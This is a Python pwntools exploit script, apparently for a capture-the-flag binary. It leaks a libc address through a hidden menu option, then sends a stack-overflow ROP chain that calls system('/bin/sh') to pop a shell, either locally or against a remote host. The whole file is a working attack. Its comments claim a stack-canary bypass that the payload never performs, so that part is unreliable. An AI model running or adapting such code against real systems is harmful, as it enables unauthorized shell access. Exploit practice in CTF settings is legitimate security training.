#!/usr/bin/env python3
import argparse
from pwn import *
import sys

# Set up pwntools for the correct architecture
context.update(arch='amd64', os='linux')
context.log_level = 'info'

libc = ELF("./lib/libc.so.6")

def exploit(target):
    # Start process or connect to remote
    if args.REMOTE:
        io = remote(args.HOST, args.PORT)
    else:
        io = process(target)
        if args.GDB:
            gdb.attach(io, '''
                       b vulnerable_function
                       b *(vulnerable_function+78)
                       continue
                       ''')

    log.info("Step 1: Leak a libc address by accessing the hidden menu option")
    io.sendlineafter(b"Choice: ", b"3735928559")  # 0xdeadbeef in decimal
    leak_output = io.recvuntil(b"Exit")
    
    # Extract the address of puts from the leaked output
    leak_line = leak_output.split(b"\n")[0]
    puts_addr = int(leak_line.split(b": ")[1], 16)
    log.success(f"Leaked puts() address: {hex(puts_addr)}")
    
    # Calculate libc base address
    libc_puts_offset = libc.symbols['puts']
    libc_system_offset = libc.symbols['system']
    libc_binsh_offset = next(libc.search(b"/bin/sh"))

    libc_base = puts_addr - libc_puts_offset
    system_addr = libc_base + libc_system_offset
    binsh_addr = libc_base + libc_binsh_offset
    
    log.success(f"Calculated libc base: {hex(libc_base)}")
    log.success(f"Calculated system() address: {hex(system_addr)}")
    log.success(f"Calculated /bin/sh address: {hex(binsh_addr)}")

    # Step 3: Send the final exploit with the correct canary value
    # Choose option 1 again to trigger vulnerable function
    io.recvuntil(b"Choice: ")
    io.sendline(b"1")
    io.recvuntil(b"Enter your input: ")
    
    # ROP chain:
    # - Padding to reach the canary position
    # - Correct canary value to bypass the check
    # - More padding to reach the saved return address
    # - pop rdi; ret gadget address (to set /bin/sh as argument to system)
    # - address of "/bin/sh" string
    # - address of system()
    
    pop_rdi_ret = libc_base + 0x2a3e5

    payload = b"A" * 64           # Padding to reach canary
    payload += b"B" * 8           # Padding to reach saved base pointer
    payload += p64(pop_rdi_ret)   # pop rdi; ret
    payload += p64(binsh_addr)    # address of "/bin/sh"
    payload += p64(system_addr)   # address of system()
    
    # Send the exploit
    io.sendline(payload)
    
    # Interact with the shell
    io.interactive()

if __name__ == "__main__":
    # Setup argument parser
    parser = argparse.ArgumentParser(description='Exploit the buffer overflow vulnerability')
    parser.add_argument('--remote', dest='REMOTE', action='store_true', help='Connect to remote target')
    parser.add_argument('--host', dest='HOST', type=str, help='Remote host')
    parser.add_argument('--port', dest='PORT', type=int, help='Remote port')
    parser.add_argument('--gdb', dest='GDB', action='store_true', help='Start GDB for debugging')
    parser.set_defaults(REMOTE=False, HOST='', PORT=0, GDB=False)
    
    args = parser.parse_args()
    
    # Path to the vulnerable binary
    target = "./chall"
    
    # Run the exploit
    exploit(target)
